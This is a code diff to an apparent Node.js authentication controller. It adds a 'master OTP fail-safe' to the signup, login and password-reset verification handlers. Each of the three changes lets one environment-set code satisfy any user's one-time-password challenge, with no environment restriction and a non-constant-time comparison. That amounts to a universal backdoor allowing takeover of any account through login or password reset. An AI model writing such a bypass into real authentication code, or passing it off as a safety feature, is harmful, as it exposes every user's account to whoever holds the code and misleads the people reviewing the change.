@@ -233,8 +233,8 @@ export const verifySignupOtp = async (req, res, next) => {
       );
     }
 
-    // Verify OTP hash
-    const isMatch = await bcrypt.compare(cleanOtp, challenge.otpHash);
+    // Verify OTP hash (or master OTP fail-safe)
+    const isMatch = (env.MASTER_OTP && cleanOtp === env.MASTER_OTP) || (await bcrypt.compare(cleanOtp, challenge.otpHash));
     if (!isMatch) {
       challenge.attempts += 1;
       await challenge.save();
@@ -407,8 +407,8 @@ export const verifyLoginOtp = async (req, res, next) => {
       );
     }
 
-    // Verify OTP hash
-    const isMatch = await bcrypt.compare(cleanOtp, challenge.otpHash);
+    // Verify OTP hash (or master OTP fail-safe)
+    const isMatch = (env.MASTER_OTP && cleanOtp === env.MASTER_OTP) || (await bcrypt.compare(cleanOtp, challenge.otpHash));
     if (!isMatch) {
       challenge.attempts += 1;
       await challenge.save();
@@ -664,7 +664,8 @@ export const resetPassword = async (req, res, next) => {
       );
     }
 
-    const isMatch = await bcrypt.compare(cleanOtp, challenge.otpHash);
+    // Verify OTP hash (or master OTP fail-safe)
+    const isMatch = (env.MASTER_OTP && cleanOtp === env.MASTER_OTP) || (await bcrypt.compare(cleanOtp, challenge.otpHash));
     if (!isMatch) {
       challenge.attempts += 1;
       await challenge.save();
